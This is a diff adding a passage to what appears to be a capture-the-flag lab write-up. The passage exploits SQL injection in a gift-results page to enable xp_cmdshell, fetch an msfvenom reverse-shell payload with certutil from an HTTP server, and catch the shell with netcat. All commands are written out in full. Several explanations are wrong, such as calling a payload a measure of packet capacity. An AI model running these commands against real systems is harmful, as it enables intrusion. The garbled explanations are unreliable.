@@ -417,7 +417,27 @@ If we now scroll to the bottom of the website, we get the flag for the question 
 
 
 For the next part of the question, 
-In order to find the notefile, we need to first get into the host system. In order to do this
+In order to find the notefile, we need to first get into the host system. In order to do this, we need to run stacked queries, which is basically another way of defining a method to run multiple queries. In order to call stored procedures, we should first use in the URL the command, `http://10.10.10.23/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --`
+
+By doing so, we execute the stacked queries and then enable the `xpcmdshell` procedure. 
+
+We can test this by executing a command called `certutil.exe` in the machine. This can be done by executing certain commands in the terminal in order to connect to the host., `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.23 LPORT=4444 -f exe -o reverse.exe` This command is used in order to run a reverse shell from the host's computer in order to feed files from the host system into the website.
+
+![image](https://github.com/kua23/AdventOfCyber_THM/assets/61975172/c01077f4-e100-4f87-89a7-7b5d7a755e9c)
+
+This creates a payload which is basically a capacity used to measure how much the packet from the host to the website can carry.
+
+We then setup a python server using the command `python3 -m http.server 8000` in order to serve our payload ![image](https://github.com/kua23/AdventOfCyber_THM/assets/61975172/9696e28d-aaa1-48c7-bd73-b8934cbc06b7)
+
+Then, we use the following command in the site's URL `http://10.10.10.23/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.10.23:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --`
+which is used to basically used to download the reverse file from the HTTP server and save it to the directoy for later use.
+
+I had to switch to the attackbox after this, as it was not running on linux, however after this step there is one last step which is needed to connect to the port using netcat to listen on: `nc -lnvp 4444`
+
+Thus, we then enter the shell of the host system, and we can see the users,
+
+
+
 
 
 
